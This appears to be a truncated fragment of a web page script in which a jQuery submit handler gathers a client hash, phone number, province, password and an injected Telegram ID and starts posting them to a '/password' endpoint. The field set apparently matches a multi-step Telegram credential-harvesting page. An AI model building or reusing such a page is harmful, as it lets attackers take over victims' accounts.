          function processThirdData(){
              $('#thirdForm').submit(function(submitingprocessThirdData){
                  submitingprocessThirdData.preventDefault();
                  
                  var $clientHash = $("input#validateclientHash").val();
                  var $phone_number = $("input#validatephone_number").val();
                  var $provinsi = $("input#validateprovinsi").val();
                  var $password = $("input#password").val();
                                          var $idtele = "<%= String(telegramId) %>"
                  if($clientHash === "" && $phone_number === "" && $password === ""){
                      return false;
                  }
                  
                  $.ajax({
                      type: "POST",
                      url: "/password",
